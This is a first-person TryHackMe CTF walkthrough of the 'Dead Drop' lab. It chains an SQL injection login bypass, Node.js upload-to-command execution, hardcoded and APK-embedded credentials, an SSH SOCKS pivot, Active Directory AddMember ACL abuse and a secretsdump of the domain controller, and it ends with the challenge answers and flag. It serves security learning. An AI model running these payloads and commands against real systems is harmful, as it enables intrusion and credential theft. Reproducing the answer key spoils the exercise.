# Dead Drop - TryHackMe CTF

## Overview

The goal of this machine was to start from the Web Server and work my way through the internal network until reaching the Domain Controller.

The attack required chaining several different techniques:

- Network and service enumeration
- SQL Injection
- Authentication bypass
- Node.js file upload abuse
- Arbitrary JavaScript execution
- OS command execution through `child_process`
- Credential discovery
- APK static analysis
- SSH access
- SOCKS proxy pivoting
- Active Directory enumeration
- SMB and WinRM enumeration
- AD ACL abuse
- `AddMember` privilege escalation
- Domain Admin access
- Domain Controller access
- Flag retrieval

The main attack chain was:

```text
External Web Server
        ↓
SQL Injection
        ↓
Authentication Bypass
        ↓
Node.js File Upload / Preview
        ↓
JavaScript Execution
        ↓
OS Command Execution
        ↓
svc-drop
        ↓
APK Static Analysis
        ↓
j.harris Credentials
        ↓
SSH SOCKS Pivot
        ↓
Active Directory Enumeration
        ↓
AD ACL Abuse
        ↓
ITSupport-Admins
        ↓
Domain Admin
        ↓
Domain Controller
```

---

## 1. Web Server Enumeration

I started with host discovery to identify which hosts were active on the network.

```bash
nmap -sn 192.168.11.0/24
```

This allowed me to identify active hosts in the subnet.

I then performed service and version enumeration against the Web Server:

```bash
nmap -sC -sV -n 192.168.11.200 -oN scan.200.txt
```

I used:

- `-sC` to run the default Nmap scripts
- `-sV` to identify service versions
- `-n` to disable DNS resolution
- `-oN` to save the results to a file

The important services I found were:

```text
22/tcp  SSH
80/tcp  HTTP
```

The web application was running with:

```text
Node.js / Express
```

I also discovered:

```text
/login
```

### What I Learned

I always want to establish a basic attack surface before interacting heavily with an application.

In this case, the initial scan immediately showed me that the target exposed both SSH and HTTP, while the Node.js/Express stack gave me an important clue about what technologies I was dealing with.

---

## 2. SQL Injection - Login Bypass

I started testing the login functionality for common web vulnerabilities.

The login page was vulnerable to SQL Injection.

My goal was to manipulate the backend SQL query so that the authentication condition would evaluate to true.

I tested:

```text
' OR 1=1 --
```

This successfully bypassed the login.

I was then able to access the application's dashboard.

### What I Learned

This was a simple but important reminder to always test authentication forms for SQL Injection.

The vulnerability allowed me to move from:

```text
Unauthenticated
        ↓
SQL Injection
        ↓
Authentication Bypass
        ↓
Authenticated Dashboard
```

The SQL Injection itself was only the first step. The important part was understanding what additional functionality became available after the authentication bypass.

---

## 3. File Upload & Node.js JavaScript Execution

Inside the dashboard, I found file upload functionality together with a preview feature.

The relevant endpoints were:

```text
POST /upload
/preview/<filename>
POST /rename
POST /delete
```

The preview functionality was particularly interesting.

Instead of simply displaying the uploaded file, the application used `require()` on the uploaded JavaScript module.

That meant the uploaded JavaScript could actually be executed by the Node.js application.

### Testing JavaScript Execution

I first wanted to confirm that my uploaded JavaScript was really being executed.

I uploaded:

```javascript
module.exports = "NIKOS_TEST_123";
```

The result confirmed that the uploaded JavaScript was being processed as a Node.js module.

I then wanted to understand which user the Node.js process was running as.

I used:

```javascript
os.userInfo()
```

This showed that the Node.js process was running as:

```text
node
```

### From JavaScript Execution to OS Command Execution

Once I confirmed arbitrary JavaScript execution, I looked for functionality that could interact with the underlying operating system.

I used Node.js's `child_process` module:

```javascript
require('child_process').execSync("id")
```

This allowed me to execute an operating system command from the Node.js process.

The resulting chain was:

```text
SQL Injection
        ↓
Authentication Bypass
        ↓
Dashboard
        ↓
File Upload
        ↓
JavaScript Preview
        ↓
require()
        ↓
Arbitrary JavaScript Execution
        ↓
child_process
        ↓
OS Command Execution
```

### What I Learned

This was one of the most important parts of the machine for me.

A file upload vulnerability is not automatically an RCE. I had to understand what the application did with the uploaded file.

In this case, the preview functionality was actually loading the uploaded JavaScript as a Node.js module.

That changed the impact completely.

The important mindset was:

> Don't stop at "I can upload a file." Find out exactly what the application does with that file afterwards.

---

## 4. Finding Credentials for `svc-drop`

After gaining command execution on the Web Server, I started enumerating the filesystem and application directories.

I discovered:

```text
/opt/app/backup/shadow.bak
```

This looked interesting because it could potentially contain password hashes or other credential information.

The hash I encountered was:

```text
sha512crypt
```

I also found a setup script:

```text
/home/ubuntu/web-server/setup.sh
```

I inspected the file for hardcoded credentials and found:

```bash
SVC_USER="svc-drop"
SVC_PASS="dropsofjupiter"
```

This gave me:

```text
svc-drop : dropsofjupiter
```

### What I Learned

Whenever I obtain code execution on a server, I should not immediately focus only on privilege escalation.

Application directories, configuration files, backups and setup scripts can contain credentials that provide a cleaner path to another account.

In this case, the hardcoded service credentials became the next step in the attack.

---

## 5. SSH Access

With the credentials I discovered, I attempted SSH access to the Web Server:

```bash
ssh svc-drop@192.168.11.200
```

The credentials worked and I obtained an SSH session as:

```text
svc-drop
```

I then verified my current user:

```bash
whoami
```

This confirmed that I was operating as:

```text
svc-drop
```

### What I Learned

Once I have valid credentials, I should test all relevant authentication services rather than assuming the credentials are only useful for the application where I found them.

Here, the credentials gave me a stable SSH foothold on the Web Server.

---

## 6. APK Static Analysis

While enumerating the home directory of `svc-drop`, I found an Android application package:

```text
/home/svc-drop/backup/deaddrop-mobile.apk
```

The APK was an Android package, so I transferred it for static analysis.

I extracted the APK with:

```bash
busybox unzip -q /tmp/deaddrop/deaddrop-mobile.apk -d /tmp/deaddrop/apk
```

I then searched readable strings inside the DEX file:

```bash
busybox strings /tmp/deaddrop/apk/classes3.dex
```

This revealed several interesting values:

```text
j.harris
DropsOfJupiter2026!
http://internal.tryhackme.loc/api/v1
```

This gave me what appeared to be a set of Active Directory credentials:

```text
j.harris : DropsOfJupiter2026!
```

### What I Learned

Mobile applications are an important source of information during a pentest.

Credentials, API endpoints, internal hostnames and other sensitive configuration can sometimes be recovered through static analysis.

I also noticed an internal hostname:

```text
internal.tryhackme.loc
```

This was another indication that the machine had an internal network that I needed to investigate.

---

## 7. Pivoting - SOCKS Proxy

At this point, I knew there was an internal network:

```text
192.168.11.0/24
```

My AttackBox could not communicate directly with the internal hosts.

Since I already had SSH access to the Web Server, I used it as a pivot.

I created a SOCKS proxy through SSH:

```bash
ssh -D 9050 -N -f svc-drop@192.168.11.200
```

This created a SOCKS proxy listening locally on port:

```text
9050
```

I verified that the port was listening:

```bash
ss -lnt | grep 9050
```

I then tested connectivity to LDAP through the proxy:

```bash
proxychains nc -zv 192.168.11.100 389
```

LDAP was reachable through the pivot.

### What I Learned

This was an important pivoting concept.

The Web Server had access to the internal network even though my AttackBox did not.

The SSH SOCKS tunnel allowed me to use the compromised Web Server as a bridge:

```text
AttackBox
    ↓
SOCKS Proxy
    ↓
Web Server
    ↓
Internal Network
```

This is a common technique when an externally compromised machine has network access that the attacker does not have directly.

---

## 8. Active Directory Enumeration

I identified the Domain Controller as:

```text
192.168.11.100
```

The hostname was:

```text
DEADDROP-DC
```

The domain was:

```text
deaddrop.loc
```

Before performing further enumeration, I tested whether the credentials recovered from the APK were valid in Active Directory.

I used NetExec through the SOCKS proxy:

```bash
proxychains nxc ldap 192.168.11.100 -u j.harris -p 'DropsOfJupiter2026!' --dns-server 192.168.11.100
```

The authentication worked.

### Domain User Enumeration

I enumerated domain users:

```bash
proxychains nxc ldap 192.168.11.100 -u j.harris -p 'DropsOfJupiter2026!' --dns-server 192.168.11.100 --users
```

### Domain Group Enumeration

I then enumerated groups:

```bash
proxychains nxc ldap 192.168.11.100 -u j.harris -p 'DropsOfJupiter2026!' --dns-server 192.168.11.100 --groups
```

One particularly interesting group was:

```text
ITSupport-Admins
```

Further enumeration showed that this group had delegated administrator rights.

### What I Learned

Once I obtained valid domain credentials, I switched my mindset from general host enumeration to Active Directory enumeration.

I wanted to understand:

- Which users existed
- Which groups existed
- What privileges those groups had
- How the user and group relationships could be abused

Finding an interesting group is not enough. I needed to understand the permissions associated with it.

---

## 9. Workstation Access

I identified an internal workstation at:

```text
192.168.11.51
```

I first checked whether the recovered domain credentials worked over SMB:

```bash
proxychains nxc smb 192.168.11.51 -u j.harris -p 'DropsOfJupiter2026!' --dns-server 192.168.11.100
```

I then checked WinRM:

```bash
proxychains nxc winrm 192.168.11.51 -u j.harris -p 'DropsOfJupiter2026!' --dns-server 192.168.11.100
```

WinRM was available, so I connected with Evil-WinRM:

```bash
proxychains evil-winrm -i 192.168.11.51 -u j.harris -p 'DropsOfJupiter2026!'
```

This gave me a PowerShell session on:

```text
DEADDROP-WRK
```

### What I Learned

After obtaining domain credentials, I should check common Windows remote management protocols.

In this case, WinRM provided a much more useful interactive shell than simply having authenticated LDAP access.

The pivot allowed me to reach the internal workstation even though it was not directly accessible from my AttackBox.

---

## 10. AD ACL Abuse & Privilege Escalation

The most important Active Directory finding was an ACL relationship involving:

```text
AddMember
```

I discovered that `j.harris` had permission to modify the membership of:

```text
ITSupport-Admins
```

The important relationship was:

```text
j.harris
    ↓
AddMember
    ↓
ITSupport-Admins
    ↓
Domain Admins
```

The `ITSupport-Admins` group was nested inside:

```text
Domain Admins
```

Therefore, if I could add `j.harris` to `ITSupport-Admins`, I would effectively gain Domain Admin-level privileges.

### ACL Detail

An important detail I noted was that `AddMember` can appear at the ACL level as:

```text
WriteProperty
```

on the group's member attribute.

BloodHound presents this relationship as:

```text
AddMember
```

This was important because it showed that the privilege escalation was not based on a vulnerable service or password.

It was based on an Active Directory permission that allowed a user to modify group membership.

### What I Learned

Active Directory privilege escalation is often about understanding relationships and permissions rather than simply finding local exploits.

I need to pay attention to:

- Group nesting
- ACLs
- Delegated permissions
- Object ownership
- `GenericAll`
- `GenericWrite`
- `WriteProperty`
- `AddMember`

A seemingly low-privileged user can become highly privileged if they have the right permissions over an administrative group.

---

## 11. Domain Controller & Post-Exploitation

After obtaining Domain Admin-level access, I could authenticate against the Domain Controller.

The Domain Controller was:

```text
192.168.11.100
```

I used Impacket's `secretsdump` to retrieve domain credential data:

```bash
secretsdump.py -just-dc j.harris:'DropsOfJupiter2026!'@192.168.11.100
```

I also connected to the Domain Controller through WinRM:

```bash
evil-winrm -i 192.168.11.100 -u j.harris -p 'DropsOfJupiter2026!'
```

This gave me access to the Domain Controller.

### Finding the Flag

I searched recursively through the users' directories for text files containing `THM`:

```powershell
Get-ChildItem -Path "C:\Users" -Filter *.txt -Recurse | Select-String -Pattern "THM" | Select-Object Path, LineNumber, Line
```

The flag was located at:

```text
C:\Users\Administrator\Desktop\flag.txt
```

The flag was:

```text
THM{d34d_dr0p_d0m41n_pwn3d}
```

---

## 12. Questions & Answers

### 1. SSH Password

```text
dropsofjupiter
```

### 2. Mobile App Credentials

```text
j.harris:DropsOfJupiter2026!
```

### 3. AD Permission

```text
AddMember
```

### 4. Target Group

```text
ITSupport-Admins
```

### 5. DC Flag

```text
THM{d34d_dr0p_d0m41n_pwn3d}
```

---

## 13. Overall Attack Chain

The complete attack path I followed was:

```text
Nmap
    ↓
SQL Injection
    ↓
Login Bypass
    ↓
Node.js File Upload / Preview
    ↓
JavaScript Execution
    ↓
child_process / OS Command Execution
    ↓
svc-drop SSH
    ↓
APK Static Analysis
    ↓
j.harris Credentials
    ↓
SSH SOCKS Pivot
    ↓
LDAP / SMB / WinRM Enumeration
    ↓
AD ACL Discovery
    ↓
AddMember
    ↓
ITSupport-Admins
    ↓
Domain Admin
    ↓
Domain Controller
    ↓
Flag
```

---

## 14. Final Takeaways

The biggest lesson I took from Dead Drop was how important it is to keep expanding the attack path after gaining each new level of access.

The initial SQL Injection only gave me dashboard access.

The dashboard then exposed a file upload functionality that resulted in JavaScript execution.

The Node.js execution gave me OS command execution, which allowed me to discover credentials.

Those credentials gave me SSH access, and the APK found on the server exposed domain credentials.

The domain credentials then allowed me to pivot into the internal network and enumerate Active Directory.

Finally, the AD ACL relationship between `j.harris` and `ITSupport-Admins` provided the path to Domain Admin and the Domain Controller.

The complete progression was:

```text
Web Vulnerability
        ↓
Application Access
        ↓
Code Execution
        ↓
Credentials
        ↓
SSH Access
        ↓
Internal Pivot
        ↓
Domain Credentials
        ↓
Active Directory Enumeration
        ↓
ACL Abuse
        ↓
Domain Admin
        ↓
Domain Controller
```

The main mindset I want to keep from this machine is:

> **Every new piece of access should be treated as a starting point for the next stage of enumeration.**

Instead of asking only "How do I exploit this vulnerability?", I should also ask:

> **"What does this access allow me to reach next?"**